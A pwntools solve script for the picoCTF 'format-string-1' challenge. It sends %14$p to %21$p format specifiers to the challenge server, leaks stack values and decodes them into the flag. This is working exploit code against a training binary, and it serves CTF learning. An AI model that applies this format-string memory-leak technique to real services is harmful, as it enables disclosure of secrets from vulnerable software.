#!/usr/bin/env python3

from pwn import *

exe = ELF("./format-string-1")

context.binary = exe

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("mimas.picoctf.net", 64176)

    return r

def main():

    '''
    We want %14$p to %21$p
    '''
    r = conn()

    payload = b''
    for i in range(14, 22):
        payload += b'%'+str(i).encode()+b'$p'

    # Send format-string payload
    r.sendlineafter(b'you:\n', payload)
    
    # Discard some input
    r.recvuntil(b'order: ')

    flag = b''
    recv = r.recvline()
    for substring in recv.split(b'0x')[1:]:
        flag += bytes.fromhex(substring.strip().decode().rjust(16, '0'))[::-1]
    print(flag)

if __name__ == "__main__":
    main()
